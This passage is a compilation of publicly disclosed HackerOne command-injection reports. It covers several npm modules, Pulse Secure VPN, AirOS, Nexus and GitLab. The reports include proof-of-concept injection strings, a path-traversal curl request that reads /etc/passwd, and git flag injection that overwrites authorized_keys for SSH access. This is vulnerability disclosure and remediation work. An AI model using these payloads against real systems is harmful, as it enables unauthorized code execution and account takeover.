  var stdio = os.stdio===undefined? STDIO:os.stdio;
  return cp.execSync(command(os), {stdio});
};

/**
 * Invoke "ffmpeg" asynchronously.
 * @param {object} os ffmpeg options.
 */
function ffmpeg(os) {
  var stdio = os.stdio===undefined? STDIO:os.stdio;
  return new Promise((fres, frej) => cp.exec(command(os), {stdio}, (err, stdout, stderr) => {
    if(err) frej(err);
    else fres({stdout, stderr});
  }));
};
ffmpeg.sync = sync;
module.exports = ffmpeg;
```
The `os` parameter contains the option parameters for the command `ffmpeg`. 
The final command that is passed to the `child_process.exec` function is built formatting the options value without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `extra-ffmpeg` module:
    -  `npm i extra-ffmpeg`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const ffmpeg = require('extra-ffmpeg');
ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F810821}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v13.13.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `extra-ffmpeg` module via insecure command formatting.

---

### [[vboxmanage.js] Command Injection via insecure command concatenation](https://hackerone.com/reports/864777)

- **Report ID:** `864777`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-08-20T09:08:23.411Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `Command Injection` issue in the `vboxmanage.js` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `vboxmanage.js`
**version:** `1.0.6`
**npm page:** `https://www.npmjs.com/package/vboxmanage.js`

## Module Description

A wrapper for VirtualBox CLI with Promises,

## Module Stats

[2] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `start` function.
Here's the code which causes the issue:

```javascript
// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L76
...
var
    child_process = require('child_process'),
...
VBoxManage.manage = function (command, options) {

    command = command || [];
    if (!(command instanceof Array)) {
        command = [command];
    }

    options = options || {};

    for (var i = 0; i < command.length; i++) {
        command[i] = escapeArg(command[i]);
    }

    Object.keys(options).forEach(function (option) {

        command.push('--' + option);
        var value = options[option];

        if (value !== true) {
            command.push(escapeArg(value));
        }

    });

    if (VBoxManage.debug) {
        console.warn("$ VBoxManage " + command.join(" "));
    }

    return new Promise(function (resolve, reject) {

        child_process.exec(vBoxManageBinary + ' ' + command.join(' '), {}, function (err, stdout, stderr) {  // <-- injection

            if (err) {
                err.stderr = stderr;
                return reject(err);
            }

            return resolve({ stdout: stdout, stderr: stderr });

        });

    });
};
...
VBoxManage.start = function (vmname, gui, options) {
    options = options || {};
    options['type'] = gui ? 'gui' : 'headless';
    return this.manage(['-nologo', 'startvm', vmname], options); // <-- user input
};
...
```
The `vmname` parameter is used to build the command that is passed to the `child_process.exec` function without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `vboxmanage.js` module:
    -  `npm i vboxmanage.js`
- create the following PoC JavaScript file (`poc.js`):

```javascript
var VBox = require('vboxmanage.js');
VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F812305}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `vboxmanage.js` module via insecure command concatenation.

---

### [Test-scripts for postgis in mason-repository using unsafe unzip of content from unclaimed bucket creates potential RCE-issues](https://hackerone.com/reports/329689)

- **Report ID:** `329689`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Mapbox
- **Reporter:** @fransrosen
- **Bounty:** - usd
- **Disclosed:** 2020-07-28T19:37:08.149Z
- **CVE(s):** -

**Summary (team):**

On March 25, 2018 @fransrosen reported a vulnerability to Mapbox. An AWS S3 bucket previously owned by Mapbox was reclaimed by this researcher, which is possible due to the global namespacing of S3 buckets. This bucket was still actively referenced in a test script. The bucket takeover therefore posed a possibility for remote code execution via this S3 bucket. 

Mapbox responded within a day and worked with the researcher to reclaim this bucket, as well as multiple other S3 buckets that had been claimed by the researcher and were still referenced in public Github repositories. 

The incident was fully resolved, including bounty payout, by April 27 2018 when all affected S3 buckets were reclaimed and code references updated.

---

### [[xps] Command Injection via insecure command concatenation](https://hackerone.com/reports/865168)

- **Report ID:** `865168`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-07-23T19:51:49.316Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `Command Injection` issue in the `xps` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `xps`
**version:** `1.0.2`
**npm page:** `https://www.npmjs.com/package/xps`

## Module Description

xps is a cross-platform library for listing and killing processes.

## Module Stats

[10] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

Here's the code which causes the issue:

```javascript
// https://github.com/robotlolita/xps/blob/master/lib/linux.js#L48
...
var shell = require('./utils').shell;
... 
exports.kill = kill;
function kill(pid) {
  return shell('kill', ['-9', pid]).map(K(undefined));  // <-- user's input
}

// --------------------------------------------------
// https://github.com/robotlolita/xps/blob/master/lib/utils.js#L26
...
var exec    = require('child_process').exec;
...
var escapeArg = JSON.stringify;
...
exports.shell = shell;
function shell(cmd, args) {
  var command = cmd + ' ' + args.map(unary(compose(escapeArg)(String))).join(' '); // <-- injection
  return new Task(function(reject, resolve) {
    exec(command, function(error, stdout, stderr) {
      if (error)  reject(error);
      else        resolve({ output: stdout, error: stderr });
    });
  });
}
```
The argument `pid` is used to build the command that is passed to the `child_process.exec` function without any sanitization.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `xps` module:
    -  `npm i xps`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const ps = require('xps');
ps.kill('`touch HACKED;`').fork();
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F813050}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.
In this case it could be helpful to parse the pid as integer (`var pid = parseInt(pid)`).

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on a `xps` module via insecure command concatenation.

---

### [[diskstats] Command Injection via insecure command concatenation](https://hackerone.com/reports/864354)

- **Report ID:** `864354`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-07-23T19:11:05.993Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `Command Injection` issue in the `diskstats` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `diskstats`
**version:** `0.0.2`
**npm page:** `https://www.npmjs.com/package/diskstats`

## Module Description

This library uses df to pull disk information such as free space & inode utilization on your system. This library only works on systems where df is installed and present within your path.

## Module Stats

[2] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

Here's the code which causes the issue:

```javascript
// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L44
....
stat.prototype._fetchSpace = function(path) {
	return new Promise((resolve, reject) => {
		this.child_process.exec('df ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection
			if (err) {
				return reject(err);
			}			

			return resolve(this._parseResponse(stdout));
		});
	});
};

// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L56
stat.prototype._fetchInodes = function(path) {
	return new Promise((resolve, reject) => {
		this.child_process.exec('df -i ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection
			if (err) {
				return reject(err);
			}

			return resolve(this._parseResponse(stdout));
		});
	});
};
...
module.exports = function(child_process, path) {
	if (!child_process) {
		child_process = require('child_process');
	}

	if (!path) {
		path = require('path');
	}

	return new stat(child_process, path);
}
```
The `path` parameter is used to build the command that is passed to the `child_process.exec` function without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `diskstats` module:
    -  `npm i diskstats`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const diskstats = require('diskstats');
diskstats.check('; touch HACKED', (err, results) => {});

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F811513}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `diskstats` module via insecure command concatenation.

---

### [RCE in AirOS 6.2.0 Devices with CSRF bypass](https://hackerone.com/reports/703659)

- **Report ID:** `703659`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @murmus
- **Bounty:** - usd
- **Disclosed:** 2020-06-30T20:52:45.697Z
- **CVE(s):** CVE-2020-8168, CVE-2020-8170

**Summary (team):**

There are certain end-points containing functionalities that are vulnerable to command injection. It is possible to craft an input string that passes the filter check but still contains commands, resulting in remote code execution. These vulnerabilities can be also can be also paired with other end points vulnerable with XSS and CSRF, allowing attacker to perform different actions, including modify configuration, upload arbitrary firmware, exfiltrate files and tokens.
These vulnerabilities were found on AirMax AirMax AirOS v6.2.0 and prior versions for TI, XW and XM boards.

The fix for these vulnerabilities were included in the new version of AirMax AirOS firmware v6.3.0 for TI, XW and XM boards.
For more details please visit:
https://community.ui.com/releases/airMAX-M-v6-3-0/c8d5dec9-4030-4d7e-b23f-6a5b35ed3d83

https://www.ui.com/download/airmax-m

---

### [OS Command Injection in Nexus Repository Manager 2.x -- Bypass for Nexus Repository Manage 2.14.15-01 Command Injection fix](https://hackerone.com/reports/724599)

- **Report ID:** `724599`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Central Security Project
- **Reporter:** @wisolzzz
- **Bounty:** - usd
- **Disclosed:** 2020-06-29T21:22:53.648Z
- **CVE(s):** -

**Summary (team):**

https://support.sonatype.com/hc/en-us/articles/360033490774

An OS command injection vulnerability has been discovered in Nexus Repository Manager requiring immediate action. The vulnerability allows for an attacker with administrative access to nxrm to execute arbitrary commands on the system. We have mitigated the issue by not allowing the server to do this. This advisory provides the pertinent information needed to properly address this vulnerability, along with the details on how to reach us if you have any further questions or concerns.

This vulnerability was identified by an external researcher and has been verified by our security team. We are not aware of any active exploits taking advantage of this issue. However, we strongly encourage all users of Nexus to immediately take the steps outlined in this advisory.

The identified vulnerability can allow for the server to execute anything on the system, that the user running the server has privileges to. We are highly recommending all instances of Nexus be upgraded to Nexus 2.14.16 or later. The latest version can be downloaded from:

https://help.sonatype.com/repomanager2/download

For detailed information on upgrade compatibility, please see:

https://support.sonatype.com/entries/21701998-Sonatype-Nexus-Upgrade-and-Compatibility-Notes

---

### [Blind Command Injection #1](https://hackerone.com/reports/807961)

- **Report ID:** `807961`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** 8x8
- **Reporter:** @bugify12334
- **Bounty:** - usd
- **Disclosed:** 2020-06-22T18:32:14.873Z
- **CVE(s):** -

**Summary (team):**

OS Command injection on text-to-speech functionality API.

**Summary (researcher):**

This issue arised because of the generic text to speech conversion tool being used here in the web application & because of the fact that the user input data was not being sanitised before taking it to the server for output of the inputed data. 

According to the issue, it was observed that **espeak** a Ubuntu command line tool was being used at the backend, because of which it was quite generic to just use simple command injection payloads, like 

```
User Input:

hey `whoami`

At the backend: 

user1@ubuntu: espeak hey `whoami`

On the frontend:

output: hey user1
```

Because of this, it allowed a full access to the backend server which was running the command.

Use of the speakers here was quite important as you could hear the output of the command injection through you speakers, which turned out to be pretty cool! :D

Thanks to 8x8 team for fixing and validating this issue.

---

### [[devcert] Command Injection via insecure command formatting](https://hackerone.com/reports/863544)

- **Report ID:** `863544`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-06-15T16:02:48.968Z
- **CVE(s):** CVE-2020-8186

**Vulnerability Information:**

I would like to report a `Command Injection` issue in the `devcert` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `devcert`
**version:** `1.1.0`
**npm page:** `https://www.npmjs.com/package/devcert`

## Module Description

devcert - Development SSL made easy

## Module Stats

[276,467] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `certificateFor` function.

Here's the code which causes the issue:

```javascript
// https://github.com/davewasmer/devcert/blob/2b1b8d40eda251616bf74fd69f00ae8222ca1171/src/index.ts#L95

export async function certificateFor<O extends Options>(domain: string, options: O = {} as O): Promise<IReturnData<O>> { // <-- starting point
  debug(`Certificate requested for ${ domain }. Skipping certutil install: ${ Boolean(options.skipCertutilInstall) }. Skipping hosts file: ${ Boolean(options.skipHostsFile) }`);

  if (options.ui) {
    Object.assign(UI, options.ui);
  }

  if (!isMac && !isLinux && !isWindows) {
    throw new Error(`Platform not supported: "${ process.platform }"`);
  }

  if (!commandExists('openssl')) {
    throw new Error('OpenSSL not found: OpenSSL is required to generate SSL certificates - make sure it is installed and available in your PATH');
  }

  let domainKeyPath = pathForDomain(domain, `private-key.key`);
  let domainCertPath = pathForDomain(domain, `certificate.crt`);

  if (!exists(rootCAKeyPath)) {
    debug('Root CA is not installed yet, so it must be our first run. Installing root CA ...');
    await installCertificateAuthority(options);
  } else if (options.getCaBuffer || options.getCaPath) {
    debug('Root CA is not readable, but it probably is because an earlier version of devcert locked it. Trying to fix...');
    await ensureCACertReadable(options);
  }

  if (!exists(pathForDomain(domain, `certificate.crt`))) { 
    debug(`Can't find certificate file for ${ domain }, so it must be the first request for ${ domain }. Generating and caching ...`);
    await generateDomainCertificate(domain); // <-- domain is our payload
  }
  ....


...
// https://github.com/davewasmer/devcert/blob/master/src/constants.ts#L19
export const pathForDomain: (domain: string, ...pathSegments: string[]) => string = path.join.bind(path, domainsDir)
...

// https://github.com/davewasmer/devcert/blob/master/src/certificates.ts#L44
...
export default async function generateDomainCertificate(domain: string): Promise<void> {
  mkdirp(pathForDomain(domain));

  debug(`Generating private key for ${ domain }`);
  let domainKeyPath = pathForDomain(domain, 'private-key.key');  // <-- the variable is in the form 
  generateKey(domainKeyPath);

  debug(`Generating certificate signing request for ${ domain }`);
  let csrFile = pathForDomain(domain, `certificate-signing-request.csr`);
  withDomainSigningRequestConfig(domain, (configpath) => {
    openssl(`req -new -config "${ configpath }" -key "${ domainKeyPath }" -out "${ csrFile }"`);
  });

  debug(`Generating certificate for ${ domain } from signing request and signing with root CA`);
  let domainCertPath = pathForDomain(domain, `certificate.crt`);

  await withCertificateAuthorityCredentials(({ caKeyPath, caCertPath }) => {
    withDomainCertificateConfig(domain, (domainCertConfigPath) => {
      openssl(`ca -config "${ domainCertConfigPath }" -in "${ csrFile }" -out "${ domainCertPath }" -keyfile "${ caKeyPath }" -cert "${ caCertPath }" -days 825 -batch`)
    });
  });
}

// Generate a cryptographic key, used to sign certificates or certificate signing requests.
export function generateKey(filename: string): void {
  debug(`generateKey: ${ filename }`);  // <-- injection
  openssl(`genrsa -out "${ filename }" 2048`);
  chmod(filename, 400);
}
```

The input parameter `domain` is used to build the `domainKeyPath` variable.
If we pass `\";touch HACKED;\"` as input, the variable  `domainKeyPath` will be something like this: `/home/ubuntu/.config/devcert/domains/";touch HACKED;"/private-key.key` (the first part depends on your OS).
As we can see the variable contains a valid shell command. Then, this variable is passed to the function `generateKey`, that finally calls `openssl` function:
```javascript
// https://github.com/davewasmer/devcert/blob/master/src/utils.ts#L12
import { execSync, ExecSyncOptions } from 'child_process';
import tmp from 'tmp';
import createDebug from 'debug';
import path from 'path';
import sudoPrompt from 'sudo-prompt';

import { configPath } from './constants';

const debug = createDebug('devcert:util');

export function openssl(cmd: string) {
  return run(`openssl ${ cmd }`, {  // <-- the command executed is: openssl genrsa -out "/home/ubuntu/.config/devcert/domains/";touch HACKED;"/private-key.key" 2048
    stdio: 'pipe',
    env: Object.assign({
      RANDFILE: path.join(configPath('.rnd'))
    }, process.env)
  });
}

export function run(cmd: string, options: ExecSyncOptions = {}) {
  debug(`exec: \`${ cmd }\``);
  return execSync(cmd, options);  // <-- call child_process.execSync 
}
...

```

## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `devcert` module:
    -  `npm i devcert`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const devcert = require('devcert');

async function poc() {
    let ssl = await devcert.certificateFor('\";touch HACKED;\"');
}
poc()
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F810294}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.execSync`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v13.13.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `devcert` module via insecure command formatting.

---

### [Command Injection (via CVE-2019-11510 and CVE-2019-11539)](https://hackerone.com/reports/680480)

- **Report ID:** `680480`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @l00ph0le
- **Bounty:** - usd
- **Disclosed:** 2020-05-07T16:57:13.463Z
- **CVE(s):** CVE-2019-11510, CVE-2019-11539

**Vulnerability Information:**

**Summary:**
The Navy has a Pulse Secure SSL VPN (https://████████/dana-na/auth/url_default/welcome.cgi) that is vulnerable to:
CVE-2019-11510 - Pre-auth Arbitrary File Reading
CVE-2019-11539 - Post-auth Command Injection

vulnerable hostname from ssl certificate: ██████████.navy.mil

The pre-auth arbitrary file reading vulnerability (CVE-2019-11510) enables an un-authenicated user to read the file /data/runtime/mtmp/lmdb/dataa/data.mdb from the Pulse VPN device. This files contains admin and other users credentials in plain-text format. This information can be used to log into the pulse device as an administrator.

Once logged in as an administrator, the post-auth command injection vulnerability (CVE-2019-11539) allows an attacker to execute commands on the device. Commands execution could lead to compromise to other servers on the network or malware implantation.

There was a talk recently at Blackhat USA that goes into great detail of the vulnerabilities and how to exploit them.

Exploit code was recently released to the public for this vulnerability. I would consider this an extremely critical issue, and others will be scanning your network trying to compromise this. The Pulse Secure version can be obtained from your device via a publicly available file here (https://██████████/dana-na/nc/nc_gina_ver.txt), so it is really easy to detect for attackers.

Here are links to Blackhat presentation, Pulse Secure Security Bulletin, exploit code, video of exploit code in action and example report found on twitter's network.

Blackhat 2019 Presentation
https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf

Pulse Secure Security Bulletin
https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101

Publicly available exploit code:
https://raw.githubusercontent.com/projectzeroindia/CVE-2019-11510/master/CVE-2019-11510.sh

Video of how exploit works:
https://www.youtube.com/watch?v=v7JUMb70ON4&feature=youtu.be

Example report found on Twitter's network
https://hackerone.com/reports/591295

## Impact
Critical - I would consider this an extremely critical issue, and others will be scanning your network trying to compromise this.

## Step-by-step Reproduction Instructions
1. From macos/linux command line issue the following command;
curl --path-as-is -s -k "https://███████/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"

This will display the /etc/passwd file from the pulse secure device. This in itself it enough to confirm the presence of both vulnerabilities.

I've attached screenshots of getting the vulnerable Pulse Secure version from the device, and confirming the arbitrary file read vulnerability. I did not attempt to login into your device as administrator. Reading /etc/passwd is enough to confirm the vulnerability exists.

## Product, Version, and Configuration (If applicable)
Pulse Secure 9.0.1.63949

## Suggested Mitigation/Remediation Actions
Install updated firmware/os from the Pulse Secure Security Bulletin
https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101

## Impact

An attacker could compromise this device, and gain access to the DoD networks, compromise other servers, or implant malware.

---

### [Git flag injection - local file overwrite to remote code execution](https://hackerone.com/reports/658013)

- **Report ID:** `658013`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 12000 usd
- **Disclosed:** 2019-12-19T00:29:02.683Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

The `wiki_blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional flags to be injected into the git command. 

For example the following API call:

```
`curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`
```

The above will generate the following git command causing the the last commit log to be written to `/tmp/file`

```
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file
```

### Steps to reproduce

1. Create a wiki new wiki page called `page` with the commit message `controlled content`
2. Search for the wiki blob via the Search API, with the injected ref flag:
```
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```
3. See that the file has been created:
```
git@gitlab-vm:~$ cat /tmp/file
commit f00f9538d29b176e9dfb2eb1bfe1eab190cad3d9
Author: Administrator <admin@example.com>
Date:   Wed Jul 24 13:08:51 2019 +0000

    controlled content
```


### Impact
This can be used to overwrite `/var/opt/gitlab/.ssh/authorized_keys` with an attackers key by following the above steps allowing remote access and code execution.

1. Create a new rsa key
2. Create a new wiki page setting the commit message to the rsa public key
3. Run the Search API with `ref=--output=/var/opt/gitlab/.ssh/authorized_keys`
4. ssh into gitlab using the created key:

```
$ ssh git@gitlab-vm.local -i gitlab
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)
$ id
uid=998(git) gid=998(git) groups=998(git)

$ cat /var/opt/gitlab/.ssh/authorized_keys
commit 00c8e52996654d02bcbdba47dc25ee73671cbfd6
Author: Administrator <admin@example.com>
Date:   Wed Jul 24 12:56:23 2019 +0000

    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local
```

### What is the current *bug* behavior?
The `ref` param is passed directly to the git command without being sanitized.

### What is the expected *correct* behavior?
The `ref` param should be sanitized or used in a way that doesn't allow for flag injection 

#### Results of GitLab environment info

```
$ sudo gitlab-rake gitlab:env:info

System information
System:		Ubuntu 16.04
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.1.0
Revision:	295480f4553
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

An attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the `git` user

---

### [Git flag injection leading to file overwrite and potential remote code execution](https://hackerone.com/reports/653125)

- **Report ID:** `653125`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 3500 usd
- **Disclosed:** 2019-12-19T00:24:21.076Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
The `ref_name` in the Commits API is not sanitized, allowing for a ref starting with `--` to be provided causing git to interpret it as a flag instead of as a ref.

If a `ref_name` such as `--output=/tmp/some_file` is used then the following command is executed by gitaly in `find_commits.go`:

`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .`

followed by

`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .`

This first writes the list of commits to the file, but then the `rev-list` command fails but not before truncating the file.

### Steps to reproduce

1. Create a repo and add a file
2. Use the commit api and pass in a `ref_name` such as `--output=/tmp/written`:

```
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

3. See that the file has been created:

```
# ls -asl /tmp/written
0 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written
```

### Impact

The bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.

One attack scenario I thought of would be to truncate `/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret`, which almost worked but ended up failing due to `authenticate_by_gitlab_shell_token` checking the token with `unauthorized! unless Devise.secure_compare(secret_token, input)` which fails if either are blank.

This method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a `git log` happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:

```
# gitlab-ctl restart unicorn
ok: run: unicorn: (pid 46755) 1s
root@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret
████████
``

This then allows for use of the internal api:
```
curl -s 'http://4290d4225642/api/v4/internal/check?secret_token=██████████'
{"api_version":"v4","gitlab_version":"12.0.3","gitlab_rev":"08a51a9db93","redis":true}

curl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=███&user_id=1'
{"id":1,"name":"Administrator","username":"root"}
```

### What is the current *bug* behavior?

The `ref_name` is not sanitized

### What is the expected *correct* behavior?

The `ref_name` should be sanitized to prevent it being used as git command flags.

#### Results of GitLab environment info

System information
System:
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
